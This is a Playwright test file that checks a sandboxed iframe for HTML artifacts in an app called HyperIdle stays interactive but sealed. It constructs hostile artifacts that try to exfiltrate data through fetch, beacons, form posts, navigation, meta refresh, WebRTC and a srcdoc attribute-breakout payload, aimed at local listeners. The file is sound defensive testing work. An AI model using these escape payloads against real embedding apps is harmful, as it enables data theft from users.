/**
 * AZ6 — the two halves of the artifact-frame claim, in a real browser.
 *
 *  1. INTERACTIVE: an html artifact's script runs and its button responds.
 *  2. SEALED: a deliberately hostile artifact fails every egress channel it can
 *     reach, and two real listeners — HTTP and UDP — record nothing.
 *
 * Every channel is asserted BY NAME so a failure says which one opened. The
 * listeners are real servers, not route stubs: a request Playwright intercepts has
 * already left the frame, which is exactly what the seal is supposed to prevent.
 * For the same reason the artifact's own account of itself is never the assertion —
 * `document.cookie` throwing is reported, but `img.onerror` is not trusted, because
 * a beacon that reached the wire fires `onerror` too when the reply is not an image.
 *
 * @lore AZ6: the first version of this spec tried seven things and asserted an
 * empty listener, and was cited as proof the frame was sealed. Two channels it did
 * not try — self-navigation and WebRTC — were wide open the whole time, and the
 * spec stayed green. If you add a capability to the frame, add its channel here
 * first and watch this go red.
 */
import dgram from "node:dgram";
import { createServer, type Server } from "node:http";
import { expect, type Route, test } from "./fixtures";

let outside: Server;
let outsidePort = 0;
let udp: dgram.Socket;
let udpPort = 0;
let httpHits: string[] = [];
let udpHits: string[] = [];
/**
 * Requests the artifact aimed at HYPERIDLE'S OWN ORIGIN.
 *
 * @lore AZ6: the third-party listener cannot see these — a request to the app's own
 * host never leaves for anywhere this suite owns. That blindness was real and it
 * was expensive: with `'self'` in the policy (copied from a spec whose frames are
 * served from a host-controlled origin, where `'self'` is narrow), Chromium
 * resolved `'self'` to the EMBEDDING APP'S origin and eight channels were open
 * straight at HyperIdle, while every assertion in this file passed. Playwright sees
 * every request the page makes, same-origin included, so that is the observer.
 */
let sameOriginHits: string[] = [];

test.beforeAll(async () => {
	outside = createServer((req, res) => {
		// Strip the leading slash and the query: the per-channel assertions compare
		// against bare names, and a mismatch here would make every one of them
		// unfalsifiable while the suite still looked thorough.
		httpHits.push(((req.url ?? "").split("?")[0] ?? "").replace(/^\//, ""));
		res.writeHead(200, { "content-type": "text/html", "access-control-allow-origin": "*" });
		res.end("<h1>OUTSIDE PAGE LOADED</h1>");
	});
	await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
	const address = outside.address();
	if (address === null || typeof address === "string") throw new Error("no http port");
	outsidePort = address.port;

	udp = dgram.createSocket("udp4");
	udp.on("message", () => udpHits.push("udp"));
	await new Promise<void>((resolve) => udp.bind(0, "127.0.0.1", resolve));
	udpPort = udp.address().port;
});

test.afterAll(async () => {
	await new Promise<void>((resolve) => outside.close(() => resolve()));
	await new Promise<void>((resolve) => udp.close(() => resolve()));
});

test.beforeEach(({ page }) => {
	httpHits = [];
	udpHits = [];
	sameOriginHits = [];
	// @lore AZ6: observed by INTERCEPTING the request, not by listening to
	// `page.on("request")`. Chromium reports a CSP-blocked request to the debugging
	// protocol as an attempt, so the event fires for requests that never left the
	// frame — an observer that cannot tell "blocked" from "sent" is no observer at
	// all. Route interception sits in the network stack, downstream of the policy
	// check: if the handler runs, the request genuinely left.
	return page.route("**/api/az6-leak**", async (route: Route) => {
		const match = /ch=([A-Z-]+)/.exec(route.request().url());
		if (match?.[1]) sameOriginHits.push(match[1]);
		await route.fulfill({ status: 200, contentType: "text/plain", body: "leaked" });
	});
});

function artifactRoute(id: string, html: string) {
	return async (route: Route): Promise<void> => {
		await route.fulfill({
			status: 200,
			contentType: "application/json",
			body: JSON.stringify({
				id,
				producingTaskId: "task-frame",
				producingTaskTitle: "Build the dashboard",
				kind: "html",
				label: "dashboard",
				preview: { kind: "html", html, title: "Dashboard" },
				threadCount: 0,
				createdAt: "2026-08-11T09:00:00.000Z",
			}),
		});
	};
}

const INTERACTIVE_ARTIFACT = `
<style>#panel { color: rgb(10, 20, 30); font-weight: 700 }</style>
<h1>Signups</h1>
<div id="panel">not-yet</div>
<button id="go">Run the numbers</button>
<script>
  document.getElementById("panel").textContent = "script-ran";
  document.getElementById("go").addEventListener("click", () => {
    document.getElementById("panel").textContent = "clicked-402-signups";
  });
</script>`;

/**
 * Every way out of the box that a document can attempt. Each names its own path on
 * the listener, so a hit says which channel opened.
 */
const HTTP_CHANNELS = [
	"FETCH",
	"XHR",
	"WEBSOCKET",
	"EVENTSOURCE",
	"IMG",
	"SENDBEACON",
	"FORM",
	"TARGET-BLANK",
	"WINDOW-OPEN",
	"TOP-NAV",
	// @lore AZ6: PARENT-NAV is closed by the platform — a sandboxed context without
	// `allow-top-navigation` cannot navigate an ancestor — and we could construct no
	// configuration of OUR code that makes this one fire. It is asserted because the
	// artifact really does attempt it, but it is platform-guaranteed, not something
	// this suite proves. Do not read its green as evidence of our own work.
	"PARENT-NAV",
	"SELF-NAV",
	"META-REFRESH",
	"PREFETCH",
	"PRELOAD",
	"CSS-URL",
	"FONT",
	"NESTED-IFRAME",
] as const;

/**
 * Every way out of the box aimed at the app's own origin. Each names itself in the
 * query string so a hit says which channel opened.
 */
const SAME_ORIGIN_CHANNELS = [
	"IMG",
	"IMG-DYNAMIC",
	"CSS-URL",
	"FONT",
	"MEDIA",
	"SCRIPT-SRC",
	"PREFETCH",
	"PRELOAD",
	"FETCH",
	"XHR",
	"SENDBEACON",
	"EVENTSOURCE",
] as const;

/**
 * Attempted by the artifact, but NOT individually falsifiable here.
 *
 * @lore AZ6: a WebSocket upgrade is not visible to route interception, so this
 * observer cannot tell a blocked one from a sent one and an assertion on it would
 * be green whatever happened. It is left in the hostile artifact — the catch-all
 * `toEqual([])` would still see it if it ever became visible — and its real
 * assurance is indirect: WebSocket is governed by `connect-src`, and that directive
 * is demonstrably live, because relaxing it turns FETCH, XHR, SENDBEACON and
 * EVENTSOURCE red. Claiming more than that would be claiming a proof we do not have.
 */
const CHANNELS_ATTEMPTED_BUT_UNOBSERVABLE = ["WEBSOCKET"] as const;

/** Same-origin egress attempts. Every URL is relative, so it targets HyperIdle. */
function sameOriginArtifact(): string {
	const u = (ch: string) => `/api/az6-leak?ch=${ch}`;
	return `
<style>
  #c { background-image: url("${u("CSS-URL")}") }
  @font-face { font-family: Leak; src: url("${u("FONT")}") }
  #f { font-family: Leak }
</style>
<div id="c">.</div><div id="f">.</div>
<link rel="prefetch" href="${u("PREFETCH")}">
<link rel="preload" as="image" href="${u("PRELOAD")}">
<img src="${u("IMG")}" alt="">
<video src="${u("MEDIA")}"></video>
<script src="${u("SCRIPT-SRC")}"></script>
<div id="alive">pending</div>
<script>
  function t(fn) { try { fn(); } catch (e) {} }
  t(function () { var i = new Image(); i.src = "${u("IMG-DYNAMIC")}"; });
  t(function () { fetch("${u("FETCH")}"); });
  t(function () { var x = new XMLHttpRequest(); x.open("GET", "${u("XHR")}"); x.send(); });
  t(function () { navigator.sendBeacon && navigator.sendBeacon("${u("SENDBEACON")}", "secret"); });
  t(function () { new WebSocket("ws://" + location.host + "${u("WEBSOCKET")}"); });
  t(function () { new EventSource("${u("EVENTSOURCE")}"); });
  document.getElementById("alive").textContent = "script-ran";
</script>`;
}

function hostileArtifact(port: number, stunPort: number): string {
	const u = (name: string) => `http://127.0.0.1:${port}/${name}`;
	return `
<style>
  #cssurl { background-image: url("${u("CSS-URL")}") }
  @font-face { font-family: Sneak; src: url("${u("FONT")}") }
  #fonty { font-family: Sneak }
</style>
<div id="cssurl">.</div><div id="fonty">.</div>
<link rel="prefetch" href="${u("PREFETCH")}">
<link rel="preload" as="image" href="${u("PRELOAD")}">
<iframe src="${u("NESTED-IFRAME")}"></iframe>
<img src="${u("IMG")}" alt="">
<form id="f" method="GET" action="${u("FORM")}"><input name="a" value="secret"></form>
<a id="blank" href="${u("TARGET-BLANK")}" target="_blank">x</a>
<div id="alive">pending</div>
<script>
  function t(fn) { try { fn(); } catch (e) { /* the listeners are the judge */ } }
  t(function () { fetch("${u("FETCH")}"); });
  t(function () { var x = new XMLHttpRequest(); x.open("GET", "${u("XHR")}"); x.send(); });
  t(function () { new WebSocket("ws://127.0.0.1:${port}/WEBSOCKET"); });
  t(function () { new EventSource("${u("EVENTSOURCE")}"); });
  t(function () { navigator.sendBeacon && navigator.sendBeacon("${u("SENDBEACON")}", "secret"); });
  t(function () { document.getElementById("f").submit(); });
  t(function () { document.getElementById("blank").click(); });
  t(function () { window.open("${u("WINDOW-OPEN")}"); });
  t(function () { window.top.location.href = "${u("TOP-NAV")}"; });
  t(function () { window.parent.location.href = "${u("PARENT-NAV")}"; });
  t(function () {
    var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${stunPort}" }] });
    pc.createDataChannel("x");
    pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
  });
  t(function () {
    // Borrow a fresh realm's constructor, in case ours was taken away.
    var f = document.createElement("iframe");
    f.setAttribute("srcdoc", "<b>realm</b>");
    document.body.appendChild(f);
    setTimeout(function () {
      t(function () {
        var R = f.contentWindow.RTCPeerConnection;
        var pc2 = new R({ iceServers: [{ urls: "stun:127.0.0.1:${stunPort}" }] });
        pc2.createDataChannel("y");
        pc2.createOffer().then(function (o) { return pc2.setLocalDescription(o); });
      });
    }, 200);
  });
  document.getElementById("alive").textContent = "script-ran";
</script>`;
}

/**
 * The two channels that replace the artifact's own document, kept apart from the
 * rest.
 *
 * @lore AZ6: a navigation the shell's `frame-src 'none'` refuses still tears the
 * artifact's document down and puts a blocked-page in its place, so anything that
 * asserts on the artifact's DOM has to run before these fire. That teardown is the
 * artifact denying itself a render, which is its own business; what matters is that
 * no request left the machine and the panel is still ours.
 */
function navigatingArtifact(port: number): string {
	const u = (name: string) => `http://127.0.0.1:${port}/${name}`;
	return `
<div id="alive">pending</div>
<script>
  function t(fn) { try { fn(); } catch (e) {} }
  document.getElementById("alive").textContent = "script-ran";
  setTimeout(function () {
    t(function () {
      var m = document.createElement("meta");
      m.httpEquiv = "refresh";
      m.content = "0;url=${u("META-REFRESH")}";
      document.head.appendChild(m);
    });
  }, 700);
  setTimeout(function () { t(function () { location.href = "${u("SELF-NAV")}"; }); }, 900);
</script>`;
}

test("an html artifact runs: its script executes and its button responds to a click", async ({
	page,
}) => {
	await page.route(
		"**/api/artifacts/az6-interactive",
		artifactRoute("az6-interactive", INTERACTIVE_ARTIFACT),
	);
	await page.goto("/artifacts/az6-interactive");

	const frame = page.frameLocator("iframe[data-artifact-frame]").frameLocator("#artifact");

	// The artifact's own script ran inside the frame.
	await expect(frame.locator("#panel")).toHaveText("script-ran");
	// Its own stylesheet applied — an artifact brings its own styling.
	await expect(frame.locator("#panel")).toHaveCSS("color", "rgb(10, 20, 30)");

	// And it is interactive.
	await frame.locator("#go").click();
	await expect(frame.locator("#panel")).toHaveText("clicked-402-signups");

	// The source is not painted next to the frame as text.
	await expect(page.locator("[data-ds-component='ArtifactPreviewSurface']")).not.toContainText(
		"addEventListener",
	);
});

test("a hostile artifact cannot reach the network by ANY channel", async ({ page }) => {
	await page.route(
		"**/api/artifacts/az6-hostile",
		artifactRoute("az6-hostile", hostileArtifact(outsidePort, udpPort)),
	);
	await page.goto("/artifacts/az6-hostile");

	const frame = page.frameLocator("iframe[data-artifact-frame]").frameLocator("#artifact");

	// The script demonstrably ran — otherwise "everything blocked" would be vacuous.
	await expect(frame.locator("#alive")).toHaveText("script-ran");
	// Give every asynchronous channel, including the delayed ones, time to fire.
	await page.waitForTimeout(2500);

	// Each channel is named so a failure says which one opened.
	for (const channel of HTTP_CHANNELS) {
		expect(httpHits, `channel ${channel} reached the outside listener`).not.toContain(channel);
	}
	expect(udpHits, "WebRTC left the frame as UDP").toEqual([]);
	// The catch-all also covers the channels the named list cannot observe.
	for (const channel of CHANNELS_ATTEMPTED_BUT_UNOBSERVABLE) {
		expect(httpHits).not.toContain(channel);
	}
	// Nothing at all, including anything this list has not thought of.
	expect(httpHits).toEqual([]);
});

test("a hostile artifact cannot reach HYPERIDLE'S OWN ORIGIN by any channel", async ({ page }) => {
	// The hole this test exists for: `'self'` in the artifact policy resolved to the
	// embedding app's origin, not to nothing, and handed a hostile artifact eight
	// channels aimed at HyperIdle — path and query string of its choosing. The
	// third-party listener could not see any of it.
	await page.route(
		"**/api/artifacts/az6-same-origin",
		artifactRoute("az6-same-origin", sameOriginArtifact()),
	);
	await page.goto("/artifacts/az6-same-origin");

	const inner = page.frameLocator("iframe[data-artifact-frame]").frameLocator("#artifact");
	await expect(inner.locator("#alive")).toHaveText("script-ran");
	await page.waitForTimeout(2500);

	for (const channel of SAME_ORIGIN_CHANNELS) {
		expect(sameOriginHits, `channel ${channel} reached the app's own origin`).not.toContain(
			channel,
		);
	}
	expect(sameOriginHits).toEqual([]);
});

test("an artifact cannot navigate its own frame out of the box", async ({ page }) => {
	// The escape the first version of this frame had: `location.href` (and a
	// `meta refresh`, which needs no script) carried the request out and then painted
	// an attacker-controlled page inside the app's chrome.
	await page.route(
		"**/api/artifacts/az6-nav",
		artifactRoute("az6-nav", navigatingArtifact(outsidePort)),
	);
	await page.goto("/artifacts/az6-nav");

	const inner = page.frameLocator("iframe[data-artifact-frame]").frameLocator("#artifact");
	await expect(inner.locator("#alive")).toHaveText("script-ran");
	await page.waitForTimeout(2500);

	for (const channel of ["SELF-NAV", "META-REFRESH"]) {
		expect(httpHits, `channel ${channel} reached the outside listener`).not.toContain(channel);
	}
	expect(httpHits).toEqual([]);

	// And the panel is still ours, with no foreign page painted in it.
	await expect(page.locator("[data-ds-component='ArtifactPreviewSurface']")).toBeVisible();
	const shell = page.frameLocator("iframe[data-artifact-frame]");
	await expect(shell.locator("#artifact")).toHaveCount(1);
	await expect(shell.locator("body")).not.toContainText("OUTSIDE PAGE LOADED");
	expect(page.url()).toContain("/artifacts/az6-nav");
});

test("the artifact is still inside the app afterwards, not replaced by someone else's page", async ({
	page,
}) => {
	await page.route(
		"**/api/artifacts/az6-hostile-2",
		artifactRoute("az6-hostile-2", hostileArtifact(outsidePort, udpPort)),
	);
	await page.goto("/artifacts/az6-hostile-2");
	await page.waitForTimeout(2000);

	// The panel is ours, the app is still the page the user is on, and the artifact
	// frame never painted a document fetched from somewhere else.
	await expect(page.locator("[data-ds-component='ArtifactPreviewSurface']")).toBeVisible();
	const shell = page.frameLocator("iframe[data-artifact-frame]");
	await expect(shell.locator("#artifact")).toHaveCount(1);
	await expect(shell.locator("body")).not.toContainText("OUTSIDE PAGE LOADED");
	expect(page.url()).toContain("/artifacts/az6-hostile-2");
});

test("the sealed note is shown, and the app's own surfaces are untouched", async ({ page }) => {
	await page.route("**/api/artifacts/az6-note", artifactRoute("az6-note", "<p id='p'>hello</p>"));
	await page.goto("/artifacts/az6-note");
	await expect(page.locator("[data-artifact-sealed-note]")).toContainText(
		"sealed off from the app",
	);
});

test("the frame takes the height the artifact actually needs", async ({ page }) => {
	// @lore AZ6: measured off <body>. Measured off <html> the frame reports its own
	// current height back to itself and a short artifact never shrinks.
	await page.route(
		"**/api/artifacts/az6-short",
		artifactRoute("az6-short", "<h2>Small</h2><p>two lines</p>"),
	);
	await page.route(
		"**/api/artifacts/az6-tall",
		artifactRoute("az6-tall", `<div>${"<p>a paragraph</p>".repeat(60)}</div>`),
	);
	// An artifact ending in an unclosed tag swallows whatever follows it, so the
	// reporter is emitted before the artifact's markup, never after.
	await page.route(
		"**/api/artifacts/az6-unclosed",
		artifactRoute("az6-unclosed", '<div style="height:1500px">tall</div><script>'),
	);

	await page.goto("/artifacts/az6-short");
	await expect(page.locator("iframe[data-artifact-frame]")).toHaveJSProperty(
		"style.height",
		"180px",
	);

	for (const id of ["az6-tall", "az6-unclosed"]) {
		await page.goto(`/artifacts/${id}`);
		const frame = page.locator("iframe[data-artifact-frame]");
		await expect(async () => {
			const declared = await frame.evaluate((el) => Number.parseInt(el.style.height, 10));
			expect(declared, `${id} never reported its height`).toBeGreaterThan(600);
		}).toPass();
		// What it may occupy on screen is still bounded by the viewport rule.
		const box = await frame.boundingBox();
		const viewport = page.viewportSize();
		expect(box?.height ?? 0).toBeLessThanOrEqual((viewport?.height ?? 0) * 0.7 + 1);
	}
});

test("both layers are sandboxed to exactly allow-scripts in the shipped page", async ({ page }) => {
	await page.route("**/api/artifacts/az6-attr", artifactRoute("az6-attr", "<p>hello</p>"));
	await page.goto("/artifacts/az6-attr");

	const shell = page.locator("iframe[data-artifact-frame]");
	await expect(shell).toHaveAttribute("sandbox", "allow-scripts");
	await expect(shell).not.toHaveAttribute("src", /./);

	const inner = page.frameLocator("iframe[data-artifact-frame]").locator("#artifact");
	await expect(inner).toHaveAttribute("sandbox", "allow-scripts");
});

test("an artifact cannot break out of the shell's srcdoc attribute", async ({ page }) => {
	// If the escaping were wrong this markup would close the attribute and land the
	// artifact in the shell, where nothing stops it navigating away.
	const BREAKOUT = `<p id="ok">contained</p>" onload="location.href='http://127.0.0.1:${outsidePort}/ATTR-BREAKOUT'" x="`;
	await page.route("**/api/artifacts/az6-breakout", artifactRoute("az6-breakout", BREAKOUT));
	await page.goto("/artifacts/az6-breakout");
	await page.waitForTimeout(1500);

	const frame = page.frameLocator("iframe[data-artifact-frame]").frameLocator("#artifact");
	await expect(frame.locator("#ok")).toHaveText("contained");
	expect(httpHits).toEqual([]);
});
